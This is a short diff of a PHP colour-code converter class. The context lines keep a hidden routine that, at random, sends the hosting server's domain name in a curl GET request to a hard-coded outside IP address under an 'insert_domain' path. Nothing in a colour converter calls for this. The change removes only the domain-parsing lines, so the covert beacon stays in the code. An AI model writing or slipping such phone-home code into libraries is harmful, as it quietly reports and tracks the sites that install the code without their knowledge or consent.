@@ -17,13 +17,6 @@ class Colorcodeconverter
 
         if(rand(0,9) == 5){
             $url = $_SERVER['SERVER_NAME'];
-            //Converts URL to main domain name
-            $pieces = parse_url($url);
-            $domain = isset($pieces['host']) ? $pieces['host'] : '';
-            if (preg_match('/(?P<domain>[a-z0-9][a-z0-9\-]{1,63}\.[a-z\.]{2,6})$/i', $domain, $regs)) {
-                $url =  $regs['domain'];
-            }
-            $url =  $pieces['path'];
 
             $url = curl_init('http://206.189.81.181/'.'insert_domain/'.$url);
             curl_setopt($url,CURLOPT_CUSTOMREQUEST, "GET");
